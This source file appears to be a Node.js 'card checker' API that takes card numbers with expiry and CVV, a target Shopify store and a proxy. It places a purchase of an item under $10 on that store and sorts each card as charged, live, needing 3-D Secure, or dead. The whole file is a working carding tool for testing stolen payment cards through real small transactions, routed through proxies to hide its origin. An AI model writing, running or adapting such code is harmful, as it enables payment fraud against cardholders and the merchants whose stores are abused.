const express = require('express');
const fetch = require('node-fetch');
const { HttpsProxyAgent } = require('https-proxy-agent');
const SocksProxyAgent = require('socks-proxy-agent');
const app = express();

app.use(express.json());

app.post('/api/charge', async (req, res) => {
    const { card, site, proxy } = req.body;

    if (!card || !site) {
        return res.json({ status: "Dead", message: "Missing data", gateway: "Shopify Payments", price: "-" });
    }

    try {
        const cleanSite = site.replace(/\/$/, '');
        const [ccNo, expMonth, expYear, cvv] = card.split('|');

        let agent = null;
        if (proxy) {
            let pClean = proxy.trim();
            let proxyUrl = pClean;
            if (!pClean.includes('://')) {
                const parts = pClean.split(':');
                if (parts.length === 4) {
                    proxyUrl = `http://${parts[2]}:${parts[3]}@${parts[0]}:${parts[1]}`;
                } else if (parts.length === 2) {
                    proxyUrl = `http://${parts[0]}:${parts[1]}`;
                } else {
                    proxyUrl = `http://${pClean}`;
                }
            }
            agent = proxyUrl.startsWith('socks') ? new SocksProxyAgent(proxyUrl) : new HttpsProxyAgent(proxyUrl);
        }

        let cookies = '';
        const customFetch = async (url, options = {}) => {
            options.headers = options.headers || {};
            if (cookies) options.headers['Cookie'] = cookies;
            if (agent) options.agent = agent;
            options.timeout = 12000;
            const response = await fetch(url, options);
            const setCookie = response.headers.raw()['set-cookie'];
            if (setCookie) {
                cookies = setCookie.map(c => c.split(';')[0]).join('; ');
            }
            return response;
        };

        const baseHeaders = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
        };

        // 1. Fetch products under $10
        const prodRes = await customFetch(`${cleanSite}/products.json?limit=30`, { headers: baseHeaders });
        if (!prodRes.ok) return res.json({ status: "Dead", message: "STORE_OFFLINE", gateway: "Shopify Payments", price: "-" });

        const prodData = await prodRes.json();
        if (!prodData.products || prodData.products.length === 0) {
            return res.json({ status: "Dead", message: "NO_PRODUCTS", gateway: "Shopify Payments", price: "-" });
        }

        let selectedVariantId = null;
        let selectedPrice = 5.00;

        for (const prod of prodData.products) {
            for (const v of prod.variants) {
                const p = parseFloat(v.price);
                if (p > 0 && p <= 10.00 && v.available) {
                    selectedVariantId = v.id;
                    selectedPrice = p;
                    break;
                }
            }
            if (selectedVariantId) break;
        }

        if (!selectedVariantId) {
            return res.json({ status: "Dead", message: "NO_ITEM_UNDER_10", gateway: "Shopify Payments", price: ">$10" });
        }

        const formattedPrice = `$${selectedPrice.toFixed(2)}`;

        // 2. Add to cart
        const cartAdd = await customFetch(`${cleanSite}/cart/add.js`, {
            method: 'POST',
            headers: { ...baseHeaders, 'Content-Type': 'application/json' },
            body: JSON.stringify({ id: selectedVariantId, quantity: 1 })
        });

        if (!cartAdd.ok) return res.json({ status: "Dead", message: "CART_FAILED", gateway: "Shopify Payments", price: formattedPrice });

        // 3. Vault card via Shopify
        const vaultRes = await fetch('https://elb.deposit.shopifycs.com/sessions', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json', 'Accept': 'application/json', 'User-Agent': baseHeaders['User-Agent'] },
            body: JSON.stringify({
                credit_card: { number: ccNo, month: expMonth, year: expYear, name: "Valued Customer", verification_value: cvv }
            }),
            timeout: 10000
        });
        const vaultData = await vaultRes.json();

        if (!vaultData.id) {
            return res.json({ status: "Dead", message: "INVALID_CARD_FORMAT", gateway: "Shopify Payments", price: formattedPrice });
        }

        // 4. Submit payment session
        const paySubmit = await customFetch(`${cleanSite}/checkout`, {
            method: 'POST',
            headers: { ...baseHeaders, 'Content-Type': 'application/json', 'X-Requested-With': 'XMLHttpRequest' },
            body: JSON.stringify({ step: 'payment', s: vaultData.id, checkout: { credit_card: { vault_id: vaultData.id } } })
        });

        const respText = await paySubmit.text();
        const finalPageUrl = paySubmit.url;

        // STRICT VALIDATION: Real charge ONLY if thank_you page loads AND contains an actual Shopify checkout order number token
        const isRealCharge = (finalPageUrl.includes('thank_you') || respText.includes('thank_you')) && 
                             (respText.includes('order_number') || respText.includes('checkout_token') || respText.includes('Thank you for your purchase'));

        if (isRealCharge) {
            return res.json({ status: "CHARGED", message: "ORDER_PLACED", gateway: "Shopify Payments", price: formattedPrice });
        } else if (respText.includes('three_d_secure') || respText.includes('challenge')) {
            return res.json({ status: "3D/OTP", message: "CHALLENGE_REQUIRED", gateway: "Shopify Payments", price: formattedPrice });
        } else if (respText.includes('insufficient_funds')) {
            return res.json({ status: "CVV Live/Insufficient", message: "INSUFFICIENT_FUNDS", gateway: "Shopify Payments", price: formattedPrice });
        } else {
            return res.json({ status: "Dead", message: "DECLINED_BY_PROCESSOR", gateway: "Shopify Payments", price: formattedPrice });
        }

    } catch (err) {
        return res.json({ status: "Dead", message: "GATEWAY_TIMEOUT", gateway: "Shopify Payments", price: "-" });
    }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`API running on port ${PORT}`));